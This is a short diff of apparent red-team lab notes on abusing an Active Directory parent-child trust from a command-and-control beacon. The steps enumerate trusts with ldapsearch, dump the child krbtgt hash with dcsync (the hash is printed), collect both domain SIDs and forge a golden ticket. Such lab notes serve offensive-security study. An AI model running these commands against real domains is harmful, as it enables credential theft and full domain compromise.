@@ -62,8 +62,8 @@ PARENT CHILD TRUST LAB (High Integrity beacon)
 1 - Enumerate trust:  ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName
 2 - Obtain the aes25 hash for child domain krbtgt account:  dcsync child.parent.com Child\krbtgt <--domain
 --- 2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9
-3 - Obtain domain sid for child: ldapsearch (objectClass=domain) --attributes objectSid
--- objectSid: S-1-5-21-690277740-3036021016-2883941857
+3 - Obtain domain sid for child: ldapsearch (objectClass=domain) --attributes objectSid  <--This is actually found as well with the full SID and RID with the dcsync
+-- objectSid: S-1-5-21-690277740-3036021016-2883941857-502 <-- missing with the ldap
 4 - Obtain Domain Sid for Parent: ldapsearch (objectClass=domain) --attributes objectSid --hostname domain_controller.domain.com --dn DC=domain,DC=com
 -- objectSid: S-1-5-21-3926355307-1661546229-813047887
 5 - Forge Golden ticket on Attacker desktop
